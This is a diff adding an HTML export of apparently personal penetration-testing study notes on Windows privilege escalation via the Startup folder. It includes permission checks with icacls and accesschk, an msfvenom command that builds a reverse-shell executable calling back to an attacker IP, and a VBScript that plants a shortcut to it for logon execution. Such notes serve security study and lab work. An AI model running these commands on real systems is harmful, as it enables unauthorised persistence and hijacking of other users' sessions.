@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>Startup Applications</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>Startup Applications</h1><br/>StartUp Applications<br />	icacls.exe &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup&quot; (PowerUp will not find this)<br />	if the BUILTIN\Users group has full access &#39;(F)&#39; to the directory, you will be able to put a file there (rev shell more than likley). When a user logs on (potentially an admin) you can spawn a shell as them.<br />	msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Kali VM IP Address] -f exe -o x.exe<br />	<br />There are directories that run everything inside of them at specified times (Mostly Logins). C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp directory will run everything inside of it at login as the user who logged in. Only .lnk files will be run (I&#39;ve been told but experienced it be not true).<br />	<br />&gt; .\accesschk.exe /accepteula -d &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp&quot;<br />	<br />VBScript to create a shortcut file<br />	Set oWS = WScript.CreateObject(&quot;WScript.Shell&quot;)<br />	sLinkFile = &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk&quot;<br />	Set oLink = oWS.CreateShortcut(sLinkFile)<br />	oLink.TargetPath = &quot;C:\PrivEsc\reverse.exe&quot;<br />	oLink.Save<br />cscript CreateShortcut.vbs<br /></div></body></html>
